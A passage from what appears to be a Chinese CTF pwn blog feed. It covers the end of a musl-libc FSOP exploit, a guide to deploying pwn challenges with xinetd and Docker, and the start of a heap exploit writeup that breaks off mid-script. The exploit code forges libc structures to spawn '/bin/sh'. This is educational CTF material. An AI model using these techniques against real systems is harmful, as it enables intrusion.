class="comment">#next</span></span><br><span class="line">        <span class="number">0x18</span>:p64(page+<span class="number">0x30</span>),<span class="comment">#mem</span></span><br><span class="line">        <span class="number">0x20</span>:p64(<span class="number">0</span>),<span class="comment">#avail_mask.free_mask</span></span><br><span class="line">        <span class="number">0x28</span>:p64(<span class="number">0x1020</span>),<span class="comment">#maplen=1,freeable=1</span></span><br><span class="line">        <span class="number">0x30</span>:p64(page+<span class="number">0x8</span>),<span class="comment">#meta</span></span><br><span class="line">        <span class="number">0x38</span>:p64(<span class="number">0</span>)<span class="comment">#fake_chunk,offset=0,故0x40即为slot</span></span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line">payload=(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xfe0</span>+payload).ljust(<span class="number">0x1100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;M1&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;M1&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;fake_struct&#x27;</span>,payload)</span><br><span class="line">payload=p64(pi(<span class="number">0x5f90</span>))+p64(page+<span class="number">0x40</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;fake_note&#x27;</span>,payload)</span><br><span class="line">delete(<span class="string">b&#x27;X&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">system=lis(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0</span>    : <span class="string">b&quot;/bin/sh\x00&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span> : li(<span class="number">0x2000</span>),</span><br><span class="line">    <span class="number">0x38</span> : li(<span class="number">0x3000</span>),</span><br><span class="line">    <span class="number">0x48</span> : system</span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;fake_file&#x27;</span>, fake_file)</span><br><span class="line">ggg()</span><br><span class="line">esc()</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>关于musl-libc的FSOP利用的调用链<br>exit:<strong>exit-&gt;stdio_exit_needed-&gt;stdio_exit_needed-&gt;close_file</strong></p><p>puts:<strong>puts-&gt;fputs_unlocked-&gt;fwrite_unlocked-&gt;__fwritex+142（call rax）</strong></p><p>具体参考文章：<a href="https://bbs.kanxue.com/thread-274640.htm">这里</a>，对于fake_io的讲解以及dequeue和queue的讲解也挺到位的</p><p>babynote本来想试着用puts调用链也做一下的，可是最后伪造meta入队列想要实现任意分配修改stdout结构体时，却因为fake_group中的meta为0，没有写入fake_meta的地址，导致get_meta的时候程序over了，后来尝试了一下，堆风水太麻烦了，就没有继续深究了，感兴趣的可以自己尝试一下</p><p><del>我是菜鸡就不试了</del></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>musl-libc的学习就到这里了，作为一个轻量化的libc，学习成本也是比较小的，攻击思路也基本就是dequeue和queue以及伪造结构体，由于没有hook函数，所以一般也是利用FSOP攻击，还是比较单一的…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;musl-libc学习（1-2-2）&quot;&gt;&lt;a href=&quot;#musl-libc学习（1-2-2）&quot; class=&quot;headerlink&quot; title=&quot;musl_libc学习（1.2.2）&quot;&gt;&lt;/a&gt;musl_libc学习（1.2.2）&lt;/h1&gt;&lt;h2 id=&quot;前</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://gggtaotao.github.io/tags/pwn/"/>
    
    <category term="musl" scheme="https://gggtaotao.github.io/tags/musl/"/>
    
  </entry>
  
  <entry>
    <title>pwn出题</title>
    <link href="https://gggtaotao.github.io/2025/07/21/pwn%E5%87%BA%E9%A2%98/"/>
    <id>https://gggtaotao.github.io/2025/07/21/pwn%E5%87%BA%E9%A2%98/</id>
    <published>2025-07-21T14:02:41.000Z</published>
    <updated>2025-07-29T06:25:43.857Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="编写程序代码"><a href="#编写程序代码" class="headerlink" title="编写程序代码"></a>编写程序代码</h2><p>写好程序代码之后C语言(或者其他)，编译成二进制可执行程序</p><p>如果只是编译的话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc your_file_name.c -o target_name</span><br></pre></td></tr></table></figure><p>去除canary</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><p>去除pie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><p>去除NX</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack  your_file_name.c -o target_name </span><br></pre></td></tr></table></figure><h2 id="ctf-xinted部署"><a href="#ctf-xinted部署" class="headerlink" title="ctf_xinted部署"></a>ctf_xinted部署</h2><h3 id="本地："><a href="#本地：" class="headerlink" title="本地："></a>本地：</h3><ol><li><p>在bin文件夹中放入要运行的二进制程序，flag内容自定</p></li><li><p>ctf_xinetd</p><p>将./your_file替换为你的文件名，这里建议将port（容器内的端口）改为80，<del>虽然不知道为什么，但貌似这样更快一点</del></p></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 9999 #容器内的端口</span><br><span class="line">    bind        = 0.0.0.0 #本地IP</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1000:1000 /home/ctf ./your_file #!!!</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>Dockerfile<br>如果要拉取ubuntu18.0以下的版本的话在注释的地方需要改一下，按原代码写</p><p>要是上面改了容器端口的话，记得把下面的暴露端口也改掉  “EXPOSE 9999  #容器对外暴露的端口”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:24.04   #拉取镜像版本</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf  #这个地方和原文件有点不同，需要修改一下，原文件的写法只适合拉去ubuntu18.0以下的版本</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 9999  #容器对外暴露的端口可能会用到的命令</span><br></pre></td></tr></table></figure></li><li><p>可能用到的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker build  -t <span class="string">&quot;pwn&quot;</span> .#用当前目录下的Dockerfile文件创建名为pwn的镜像</span><br><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:1234:9999&quot;</span> -h <span class="string">&quot;pwn&quot;</span> --name=<span class="string">&quot;pwn&quot;</span> pwn#将本地的1234端口映射到容器中的9999端口，并给容器内的主机起名为pwn，同时将这个容器也命名为pwn，方便管理，之后通过nc 0.0.0.0 1234就可以成功了</span><br><span class="line">docker ps <span class="comment">#可以查看目前有哪些容器</span></span><br><span class="line">docker stop 容器名/ID <span class="comment">#停止容器</span></span><br><span class="line">docker <span class="built_in">rm</span> 容器名/ID <span class="comment">#删除容器</span></span><br><span class="line">docker rmi 镜像名#删除镜像</span><br><span class="line">docker images#查看有哪些镜像</span><br><span class="line">docker <span class="built_in">exec</span> -it  容器名/ID /bin/bash <span class="comment">#进入容器</span></span><br></pre></td></tr></table></figure></li><li><p>start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure></li></ol><h3 id="GZ平台部署-动态flag"><a href="#GZ平台部署-动态flag" class="headerlink" title="GZ平台部署(动态flag)"></a>GZ平台部署(动态flag)</h3><ol><li><p>在部署动态flag的时候我把start.sh改为了flag.sh,对应的Dockerfile里的内容也要修改</p></li><li><p>ctf_xinted</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 80</span><br><span class="line">    bind        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1001:1001 /home/ctf ./your_file</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:24.04</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./flag.sh /flag.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /flag.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/flag.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>flag.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$GZCTF_FLAG</span> &gt; /home/ctf/flag</span><br><span class="line"><span class="comment"># 清除环境变量</span></span><br><span class="line"><span class="built_in">unset</span> GZCTF_FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure></li><li><p>之后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build  -t <span class="string">&quot;pwn&quot;</span> .#创建镜像</span><br></pre></td></tr></table></figure></li><li><p>将镜像push到github仓库里</p><ol><li><p>现在github里弄一个Personal access tokens``Tokens(classic)，方便写入</p></li><li><p>bash命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> your_token | docker login ghcr.io --username your_id --password-stdin <span class="comment">#your_id 为你的github的用户名</span></span><br><span class="line">docker tag name_of_package ghcr.io/your_id/app:latest <span class="comment"># name_of_package为本地已经存在的镜像 app为你将要上传到仓库的名称 latest为标签</span></span><br><span class="line">docker push ghcr.io/your_id/app:latest <span class="comment">#成功push</span></span><br></pre></td></tr></table></figure><p>完成之后便可以在github里看到push进来的镜像了</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-23%20124220.png" alt="屏幕截图 2025-07-23 124220"></p></li></ol></li><li><p>在GZ平台上出题的时候将自己github里的镜像pull到平台里即可，记得按照自己镜像里的端口设置端口号</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-23%20124826.png" alt="屏幕截图 2025-07-23 124826"></p></li></ol><p>参考文章：</p><p><a href="https://skynionkrz.github.io/2024/08/22/出题流程/#0x04-将容器镜像push到github">链接1</a></p><p><a href="https://blog.csdn.net/Myon5/article/details/131763593">链接2</a></p><p><a href="https://xz.aliyun.com/news/13944">链接3</a></p><h2 id="出题完成啦！！！"><a href="#出题完成啦！！！" class="headerlink" title="出题完成啦！！！"></a>出题完成啦！！！</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;h2 id=&quot;编写程序代码&quot;&gt;&lt;a href=&quot;#编写程序代码&quot; class=&quot;headerlink&quot; title=&quot;编写程序代码&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="pwn 出题 ctf_xinetd" scheme="https://gggtaotao.github.io/tags/pwn-%E5%87%BA%E9%A2%98-ctf-xinetd/"/>
    
  </entry>
  
  <entry>
    <title>L3 pwn</title>
    <link href="https://gggtaotao.github.io/2025/07/20/L3-pwn/"/>
    <id>https://gggtaotao.github.io/2025/07/20/L3-pwn/</id>
    <published>2025-07-20T14:53:22.000Z</published>
    <updated>2025-07-21T04:59:27.692Z</updated>
    
    <content type="html"><![CDATA[<h1 id="heack-revenge"><a href="#heack-revenge" class="headerlink" title="heack_revenge"></a>heack_revenge</h1><p>这个题比赛中没做出来，赛后复现一下</p><ol><li><p>这个题第一步就卡住我了，（<del>我还是太菜了</del>），这个题通过修改索引可以溢出到ret地址，但是最多只能覆盖一个字节，也就是说，要在0x1800~0x1900这段代码内寻找有用的gadget，结果这个题在0x186a这个地方藏了一个pop rbp，这个是解题的关键</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-20%20230952.png" alt=""></p></li></ol><ol><li><p>通过pop rbp之后，调试可以发现，rbp会指向index为0的chunk，而且可以通过修改hp，attack，可以修改chunk头中的size部分，实现堆叠，堆风水布局可以泄露libc和heap</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-21%20100010.png" alt=""></p><p>泄露libc后，在上图rbp指向的chunk中写入rop链，ret时便可以劫持程序执行流，get_shell !!!</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> tty </span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fight</span>(<span class="params">concent</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;You grip your sword and shout:&#x27;</span>)</span><br><span class="line">    sl(concent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hp</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">note</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,concent</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Enter diary content size (1-2048): &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Input your content: &#x27;</span>,concent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index,size</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span 